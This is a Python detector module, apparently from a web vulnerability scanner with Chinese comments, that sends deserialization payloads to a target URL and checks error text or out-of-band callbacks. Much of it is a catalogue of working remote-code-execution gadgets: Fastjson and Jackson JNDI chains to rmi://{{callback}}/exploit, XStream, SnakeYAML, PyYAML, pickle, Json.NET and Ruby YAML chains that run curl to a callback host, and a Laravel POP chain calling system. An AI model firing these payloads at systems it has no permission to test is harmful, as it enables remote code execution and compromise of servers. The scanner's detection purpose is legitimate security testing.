#!/usr/bin/env python3
"""
deserialize.py - 反序列化漏洞检测器

检测多种语言/框架的反序列化漏洞:
- Java (ObjectInputStream, XStream, Fastjson, Jackson, etc.)
- PHP (unserialize)
- Python (pickle, yaml)
- .NET (BinaryFormatter, JavaScriptSerializer)
- Ruby (Marshal, YAML)
"""

from dataclasses import dataclass
from typing import Any, Dict, List, Optional, Tuple
from enum import Enum
import base64
import re
import logging

from ..base import BaseDetector
from ..result import DetectionResult, Severity, DetectorType

logger = logging.getLogger(__name__)


class DeserializeType(Enum):
    """反序列化类型"""
    JAVA_OBJECTINPUTSTREAM = 'java_ois'
    JAVA_XSTREAM = 'java_xstream'
    JAVA_FASTJSON = 'java_fastjson'
    JAVA_JACKSON = 'java_jackson'
    JAVA_SNAKEYAML = 'java_snakeyaml'
    PHP_UNSERIALIZE = 'php_unserialize'
    PYTHON_PICKLE = 'python_pickle'
    PYTHON_YAML = 'python_yaml'
    DOTNET_BINARY = 'dotnet_binary'
    DOTNET_JSON = 'dotnet_json'
    RUBY_MARSHAL = 'ruby_marshal'
    RUBY_YAML = 'ruby_yaml'


@dataclass
class DeserializePayload:
    """反序列化Payload"""
    type: DeserializeType
    name: str
    payload: str
    detection_pattern: Optional[str] = None
    encoding: str = 'raw'  # raw, base64, url
    content_type: Optional[str] = None
    oob_callback: bool = False
    description: str = ''


class DeserializeDetector(BaseDetector):
    """反序列化漏洞检测器
    
    特点:
    1. 多语言支持 - Java/PHP/Python/.NET/Ruby
    2. 多框架覆盖 - Fastjson/Jackson/XStream等
    3. 带外检测 - OOB DNS/HTTP callback
    4. 智能指纹 - 自动识别目标技术栈
    """
    
    name = 'deserialize'
    description = '反序列化漏洞检测'
    vuln_type = 'deserialization'
    severity = Severity.CRITICAL
    detector_type = DetectorType.INJECTION
    
    # Java 反序列化魔术字节
    JAVA_MAGIC = b'\xac\xed\x00\x05'
    
    # PHP 序列化特征
    PHP_PATTERN = re.compile(r'^[aOCsidb]:\d+:')
    
    # Fastjson 特征
    FASTJSON_PATTERN = re.compile(r'@type|autoType', re.IGNORECASE)
    
    def __init__(self, config: Optional[Dict[str, Any]] = None):
        super().__init__(config)
        self.oob_domain = config.get('oob_domain') if config else None
        self.payloads = self._init_payloads()
    
    def _init_payloads(self) -> List[DeserializePayload]:
        """初始化检测Payload"""
        payloads = []
        
        # ============================================================
        # Java Payloads
        # ============================================================
        
        # Fastjson RCE Payloads (multiple versions)
        payloads.append(DeserializePayload(
            type=DeserializeType.JAVA_FASTJSON,
            name='fastjson_1.2.24_rce',
            payload='{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}',
            content_type='application/json',
            oob_callback=True,
            description='Fastjson <= 1.2.24 RCE via JdbcRowSetImpl',
        ))
        
        payloads.append(DeserializePayload(
            type=DeserializeType.JAVA_FASTJSON,
            name='fastjson_1.2.47_rce',
            payload='{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}}',
            content_type='application/json',
            oob_callback=True,
            description='Fastjson <= 1.2.47 RCE bypass',
        ))
        
        payloads.append(DeserializePayload(
            type=DeserializeType.JAVA_FASTJSON,
            name='fastjson_1.2.68_rce',
            payload='{"@type":"java.lang.AutoCloseable","@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}',
            content_type='application/json',
            oob_callback=True,
            description='Fastjson <= 1.2.68 RCE expectClass bypass',
        ))
        
        # Jackson polymorphic deserialization
        payloads.append(DeserializePayload(
            type=DeserializeType.JAVA_JACKSON,
            name='jackson_polymorphic_rce',
            payload='["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"rmi://{{callback}}/exploit","autoCommit":true}]',
            content_type='application/json',
            oob_callback=True,
            description='Jackson polymorphic type handling RCE',
        ))
        
        # XStream RCE
        payloads.append(DeserializePayload(
            type=DeserializeType.JAVA_XSTREAM,
            name='xstream_1.4.17_rce',
            payload='''<sorted-set>
  <string>foo</string>
  <dynamic-proxy>
    <interface>java.lang.Comparable</interface>
    <handler class="java.beans.EventHandler">
      <target class="java.lang.ProcessBuilder">
        <command>
          <string>curl</string>
          <string>{{callback}}</string>
        </command>
      </target>
      <action>start</action>
    </handler>
  </dynamic-proxy>
</sorted-set>''',
            content_type='application/xml',
            oob_callback=True,
            description='XStream RCE via EventHandler',
        ))
        
        # SnakeYAML RCE
        payloads.append(DeserializePayload(
            type=DeserializeType.JAVA_SNAKEYAML,
            name='snakeyaml_rce',
            payload='!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://{{callback}}/exploit"]]]]',
            content_type='application/x-yaml',
            oob_callback=True,
            description='SnakeYAML RCE via ScriptEngineManager',
        ))
        
        # ============================================================
        # PHP Payloads
        # ============================================================
        
        payloads.append(DeserializePayload(
            type=DeserializeType.PHP_UNSERIALIZE,
            name='php_laravel_rce',
            payload='O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"\x00*\x00events";O:28:"Illuminate\\Events\\Dispatcher":1:{s:12:"\x00*\x00listeners";a:1:{s:20:"Illuminate\\Auth\\test";a:1:{i:0;s:6:"system";}}}s:8:"\x00*\x00event";s:20:"{{command}}";}',
            encoding='raw',
            oob_callback=False,
            description='Laravel POP chain RCE',
        ))
        
        payloads.append(DeserializePayload(
            type=DeserializeType.PHP_UNSERIALIZE,
            name='php_phar_metadata',
            payload='O:8:"stdClass":0:{}',  # Trigger for phar://
            encoding='raw',
            oob_callback=False,
            description='PHP Phar deserialization trigger',
        ))
        
        # ============================================================
        # Python Payloads
        # ============================================================
        
        # Pickle RCE
        pickle_payload = self._generate_pickle_payload()
        payloads.append(DeserializePayload(
            type=DeserializeType.PYTHON_PICKLE,
            name='python_pickle_rce',
            payload=pickle_payload,
            encoding='base64',
            oob_callback=True,
            description='Python pickle RCE via __reduce__',
        ))
        
        # PyYAML RCE
        payloads.append(DeserializePayload(
            type=DeserializeType.PYTHON_YAML,
            name='python_yaml_rce',
            payload='!!python/object/apply:os.system ["curl {{callback}}"]',
            content_type='application/x-yaml',
            oob_callback=True,
            description='PyYAML unsafe load RCE',
        ))
        
        payloads.append(DeserializePayload(
            type=DeserializeType.PYTHON_YAML,
            name='python_yaml_subprocess',
            payload='!!python/object/new:subprocess.check_output [[curl, {{callback}}]]',
            content_type='application/x-yaml',
            oob_callback=True,
            description='PyYAML subprocess RCE variant',
        ))
        
        # ============================================================
        # .NET Payloads
        # ============================================================
        
        # TypeNameHandling.All vulnerability
        payloads.append(DeserializePayload(
            type=DeserializeType.DOTNET_JSON,
            name='dotnet_typenaamehandling',
            payload='{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","$values":["cmd","/c curl {{callback}}"]},"ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}',
            content_type='application/json',
            oob_callback=True,
            description='.NET Json.NET TypeNameHandling RCE',
        ))
        
        # ============================================================
        # Ruby Payloads
        # ============================================================
        
        payloads.append(DeserializePayload(
            type=DeserializeType.RUBY_YAML,
            name='ruby_yaml_erb',
            payload="--- !ruby/object:Gem::Installer\ni: x\n--- !ruby/object:Gem::SpecFetcher\ni: y\n--- !ruby/object:Gem::Requirement\nrequirements:\n  !ruby/object:Gem::Package::TarReader\n  io: &1 !ruby/object:Net::BufferedIO\n    io: &1 !ruby/object:Gem::Package::TarReader::Entry\n       read: 0\n       header: \"abc\"\n    debug_output: &1 !ruby/object:Net::WriteAdapter\n       socket: &1 !ruby/object:Gem::RequestSet\n           sets: !ruby/object:Net::WriteAdapter\n               socket: !ruby/module 'Kernel'\n               method_id: :system\n           git_set: curl {{callback}}\n       method_id: :resolve",
            content_type='application/x-yaml',
            oob_callback=True,
            description='Ruby YAML unsafe_load RCE',
        ))
        
        return payloads
    
    def _generate_pickle_payload(self) -> str:
        """生成Python pickle payload (base64编码)"""
        # 简化的pickle RCE payload
        # 实际使用时应该动态生成
        pickle_code = b'''cos
system
(S'curl {{callback}}'
tR.'''
        return base64.b64encode(pickle_code).decode()
    
    def detect(self, url: str, **kwargs) -> List[DetectionResult]:
        """同步检测方法 - 执行反序列化漏洞检测
        
        Args:
            url: 目标URL
            **kwargs: 额外参数，包括 context, headers, params 等
        
        Returns:
            检测结果列表
        """
        self._log_detection_start(url)
        results: List[DetectionResult] = []
        
        context = kwargs.get('context', {})
        tech_stack = context.get('tech_stack', {})
        
        # 确定要测试的反序列化类型
        types_to_test = self._identify_deserialize_types(url, context)
        
        findings: List[Dict[str, Any]] = []
        
        for dtype in types_to_test:
            type_payloads = [p for p in self.payloads if p.type == dtype]
            
            for payload_info in type_payloads:
                try:
                    is_vuln, evidence = self._test_payload_sync(
                        url, payload_info, context
                    )
                    
                    if is_vuln:
                        findings.append({
                            'type': dtype.value,
                            'payload_name': payload_info.name,
                            'description': payload_info.description,
                            'evidence': evidence,
                        })
                        
                        # 创建检测结果
                        result = self._create_result(
                            url=url,
                            vulnerable=True,
                            param=None,
                            payload=payload_info.payload,
                            evidence=evidence,
                            confidence=0.85,
                            remediation='禁用不安全的反序列化功能，使用白名单验证反序列化类型',
                            extra={
                                'deserialize_type': dtype.value,
                                'payload_name': payload_info.name,
                                'description': payload_info.description,
                            }
                        )
                        results.append(result)
                        
                        logger.warning(
                            f"Deserialization vulnerability found: {dtype.value} "
                            f"({payload_info.name}) at {url}"
                        )
                        
                except Exception as e:
                    logger.debug(f"Payload {payload_info.name} failed: {e}")
        
        self._log_detection_end(url, results)
        return results
    
    def _test_payload_sync(
        self,
        url: str,
        payload_info: DeserializePayload,
        context: Dict[str, Any]
    ) -> Tuple[bool, Optional[str]]:
        """同步测试单个payload"""
        
        # 准备payload
        payload = payload_info.payload
        
        # 替换OOB回调
        callback_id = None
        if payload_info.oob_callback and self.oob_domain:
            callback_id = self._generate_callback_id()
            callback_url = f"http://{callback_id}.{self.oob_domain}"
            payload = payload.replace('{{callback}}', callback_url)
        
        # 发送请求
        headers: Dict[str, str] = {}
        if payload_info.content_type:
            headers['Content-Type'] = payload_info.content_type
        
        try:
            response = self._safe_request(
                'POST',
                url,
                headers=headers,
                data=payload,
            )
            
            if response is None:
                return False, None
            
            # 检查响应
            response_body = getattr(response, 'text', '') or ''
            response_status = getattr(response, 'status_code', 200)
            
            if self._check_error_response_sync(response_body, response_status, payload_info.type):
                return True, f"Error-based detection: {response_body[:200]}"
        
        except Exception as e:
            logger.debug(f"Request failed: {e}")
        
        return False, None
    
    def _check_error_response_sync(
        self,
        body: str,
        status: int,
        dtype: DeserializeType
    ) -> bool:
        """检查错误响应中的漏洞指示"""
        body_lower = body.lower()
        
        # 错误状态码且包含特征信息
        if status >= 400:
            # Java反序列化错误特征
            java_indicators = [
                'classnotfound',
                'objectinputstream',
                'deserialize',
                'unmarshall',
                'xstream',
                'fastjson',
                'jackson',
            ]
            
            # PHP反序列化错误特征
            php_indicators = [
                'unserialize',
                '__wakeup',
                '__destruct',
                'phar://',
            ]
            
            # Python反序列化错误特征
            python_indicators = [
                'pickle',
                'unpickle',
                'yaml.load',
                'yaml.unsafe_load',
            ]
            
            indicators: List[str] = []
            if dtype.value.startswith('java'):
                indicators = java_indicators
            elif dtype.value.startswith('php'):
                indicators = php_indicators
            elif dtype.value.startswith('python'):
                indicators = python_indicators
            
            return any(ind in body_lower for ind in indicators)
        
        return False
    
    def _identify_deserialize_types(
        self, 
        target: str, 
        context: Dict[str, Any]
    ) -> List[DeserializeType]:
        """识别目标可能的反序列化类型"""
        types = []
        
        tech_stack = context.get('tech_stack', {})
        language = tech_stack.get('language', '').lower()
        framework = tech_stack.get('framework', '').lower()
        headers = context.get('response_headers', {})
        
        # 根据技术栈判断
        if 'java' in language or 'spring' in framework:
            types.extend([
                DeserializeType.JAVA_FASTJSON,
                DeserializeType.JAVA_JACKSON,
                DeserializeType.JAVA_XSTREAM,
                DeserializeType.JAVA_SNAKEYAML,
            ])
        
        if 'php' in language or 'laravel' in framework:
            types.append(DeserializeType.PHP_UNSERIALIZE)
        
        if 'python' in language or 'flask' in framework or 'django' in framework:
            types.extend([
                DeserializeType.PYTHON_PICKLE,
                DeserializeType.PYTHON_YAML,
            ])
        
        if 'c#' in language or '.net' in language or 'asp.net' in framework:
            types.extend([
                DeserializeType.DOTNET_JSON,
                DeserializeType.DOTNET_BINARY,
            ])
        
        if 'ruby' in language or 'rails' in framework:
            types.extend([
                DeserializeType.RUBY_YAML,
                DeserializeType.RUBY_MARSHAL,
            ])
        
        # 根据Content-Type判断
        content_type = headers.get('content-type', '').lower()
        if 'json' in content_type:
            if DeserializeType.JAVA_FASTJSON not in types:
                types.append(DeserializeType.JAVA_FASTJSON)
            if DeserializeType.JAVA_JACKSON not in types:
                types.append(DeserializeType.JAVA_JACKSON)
        
        if 'xml' in content_type:
            if DeserializeType.JAVA_XSTREAM not in types:
                types.append(DeserializeType.JAVA_XSTREAM)
        
        if 'yaml' in content_type:
            types.extend([
                DeserializeType.JAVA_SNAKEYAML,
                DeserializeType.PYTHON_YAML,
                DeserializeType.RUBY_YAML,
            ])
        
        # 如果无法识别，测试常见类型
        if not types:
            types = [
                DeserializeType.JAVA_FASTJSON,
                DeserializeType.JAVA_JACKSON,
                DeserializeType.PHP_UNSERIALIZE,
            ]
        
        return list(set(types))  # 去重
    
    async def _test_payload(
        self,
        target: str,
        payload_info: DeserializePayload,
        context: Dict[str, Any]
    ) -> Tuple[bool, Optional[str]]:
        """测试单个payload"""
        
        # 准备payload
        payload = payload_info.payload
        
        # 替换OOB回调
        if payload_info.oob_callback and self.oob_domain:
            callback_id = self._generate_callback_id()
            callback_url = f"http://{callback_id}.{self.oob_domain}"
            payload = payload.replace('{{callback}}', callback_url)
        
        # 编码处理
        if payload_info.encoding == 'base64':
            # payload已经是base64
            pass
        elif payload_info.encoding == 'url':
            from urllib.parse import quote
            payload = quote(payload)
        
        # 发送请求
        headers = {}
        if payload_info.content_type:
            headers['Content-Type'] = payload_info.content_type
        
        try:
            response = await self._send_request(
                target,
                method='POST',
                headers=headers,
                body=payload,
                context=context,
            )
            
            # 检查响应
            if self._check_error_response(response, payload_info.type):
                return True, f"Error-based detection: {response.get('body', '')[:200]}"
            
            # 检查OOB回调
            if payload_info.oob_callback and self.oob_domain:
                # 等待回调
                import asyncio
                await asyncio.sleep(3)
                
                if await self._check_oob_callback(callback_id):
                    return True, f"OOB callback received: {callback_id}"
        
        except Exception as e:
            logger.debug(f"Request failed: {e}")
        
        return False, None
    
    def _check_error_response(
        self, 
        response: Dict[str, Any], 
        dtype: DeserializeType
    ) -> bool:
        """检查错误响应中的漏洞指示"""
        body = response.get('body', '').lower()
        status = response.get('status', 200)
        
        # 错误状态码且包含特征信息
        if status >= 400:
            # Java反序列化错误特征
            java_indicators = [
                'classnotfound',
                'objectinputstream',
                'deserialize',
                'unmarshall',
                'xstream',
                'fastjson',
                'jackson',
            ]
            
            # PHP反序列化错误特征
            php_indicators = [
                'unserialize',
                '__wakeup',
                '__destruct',
                'phar://',
            ]
            
            # Python反序列化错误特征
            python_indicators = [
                'pickle',
                'unpickle',
                'yaml.load',
                'yaml.unsafe_load',
            ]
            
            indicators = []
            if dtype.value.startswith('java'):
                indicators = java_indicators
            elif dtype.value.startswith('php'):
                indicators = php_indicators
            elif dtype.value.startswith('python'):
                indicators = python_indicators
            
            return any(ind in body for ind in indicators)
        
        return False
    
    def _generate_callback_id(self) -> str:
        """生成唯一回调ID"""
        import uuid
        return f"ds-{uuid.uuid4().hex[:8]}"
    
    async def _check_oob_callback(self, callback_id: str) -> bool:
        """检查OOB回调是否收到"""
        # 这里应该集成OOB平台检查
        # 简化实现
        return False
    
    async def _send_request(
        self,
        target: str,
        method: str = 'GET',
        headers: Optional[Dict[str, str]] = None,
        body: Optional[str] = None,
        context: Optional[Dict[str, Any]] = None,
    ) -> Dict[str, Any]:
        """发送HTTP请求"""
        # 使用项目的HTTP客户端
        try:
            from core.http import AsyncHTTPClient
            client = AsyncHTTPClient()
            
            response = await client.request(
                method=method,
                url=target,
                headers=headers or {},
                data=body,
            )
            
            return {
                'status': response.status_code,
                'headers': dict(response.headers),
                'body': response.text,
            }
        except ImportError:
            # 回退到aiohttp
            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.request(
                    method, 
                    target, 
                    headers=headers,
                    data=body,
                    ssl=False,
                ) as response:
                    return {
                        'status': response.status,
                        'headers': dict(response.headers),
                        'body': await response.text(),
                    }


class FastjsonDetector(DeserializeDetector):
    """Fastjson专用检测器
    
    针对Fastjson的更深度检测，包括:
    - 版本探测
    - 绕过技术
    - 链式利用
    """
    
    name = 'fastjson'
    description = 'Fastjson反序列化漏洞检测'
    
    # Fastjson版本探测payload
    VERSION_DETECT_PAYLOADS = [
        # 1.2.24及以下
        ('1.2.24', '{"@type":"java.net.Inet4Address","val":"{{callback}}"}'),
        # 1.2.25-1.2.41
        ('1.2.25-41', '{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://{{callback}}/exploit"}'),
        # 1.2.42-1.2.47
        ('1.2.42-47', '{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://{{callback}}/exploit"}'),
        # 1.2.48-1.2.68
        ('1.2.48-68', '{"@type":"java.lang.AutoCloseable"'),
    ]
    
    async def detect_version(self, target: str) -> Optional[str]:
        """探测Fastjson版本"""
        # 实现版本探测逻辑
        pass
    
    async def detect_with_bypass(
        self,
        target: str,
        context: Optional[Dict[str, Any]] = None
    ) -> List[DetectionResult]:
        """使用绕过技术检测"""
        # 实现绕过检测逻辑
        return []